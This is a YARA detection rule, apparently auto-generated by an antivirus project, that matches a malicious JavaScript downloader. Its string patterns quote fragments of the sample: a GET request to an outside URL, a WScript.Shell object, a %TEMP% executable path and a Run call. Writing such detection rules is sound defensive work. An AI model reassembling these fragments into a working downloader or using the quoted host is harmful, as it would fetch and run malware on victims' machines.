rule sig_20160401_effd3afcd9dc0fe2f947ed2484c05fe0 {
  meta:
    description = "datamaliciousorder - file 20160401_effd3afcd9dc0fe2f947ed2484c05fe0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "eac765ea061c2bf21b1fa32f4255ec2bf99121b2c09077832adc40534031ce52"

  strings:
    $s1  = "HihOw[CrsXj](\"G\" + \"ET\", \"http://abnregistrationaustralia.com.au/k38sa\", false);" fullword ascii
    $s2  = "function CuCgr(GofYs, IhnGhm){MwkXb = MwkXb * 1; return GofYs - IhnGhm;};" fullword ascii
    $s3  = "var FevXi = function HziJkp() {return WScript[WflMfm](\"WScript\"+\".Shell\");}(), HsoEq = 11;" fullword ascii
    $s4  = "if (HihOw[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function LxfDfv() {return FevXi[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Wt5yvAZSmevHz.ex\" + \"e\";};" fullword ascii
    $s6  = "function DeaZan(){return ZwFm + \"\";};" fullword ascii
    $s7  = "function PnKd() {return ((ElSz == true) && (ElSz == GjNjt)) ? 1 : MwkXb;};" fullword ascii
    $s8  = "GjNjt = true; " fullword ascii
    $s9  = "var CfcZm = false;" fullword ascii
    $s10 = "function RlgQyb()" fullword ascii
    $s11 = "function LiTrd(){return WflMfm;};" fullword ascii
    $s12 = "function TqjXk(){return 23;};" fullword ascii
    $s13 = "function DiWj(CtWv){FevXi[\"R\"+\"un\"](CtWv, MwkXb, MwkXb);};" fullword ascii
    $s14 = "return CuCgr(OpTri, WcrBk);" fullword ascii
    $s15 = "}while (FigHii);" fullword ascii
    $s16 = "ElSz = true; " fullword ascii
    $s17 = "var UznQmu = new this[\"Date\"]();" fullword ascii
    $s18 = "var GjNjt = false;" fullword ascii
    $s19 = "var ElSz = false;" fullword ascii
    $s20 = "function NrMhh(OsZek) {var NiYwt = (1, 2, 3, 4, 5, OsZek); return NiYwt;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}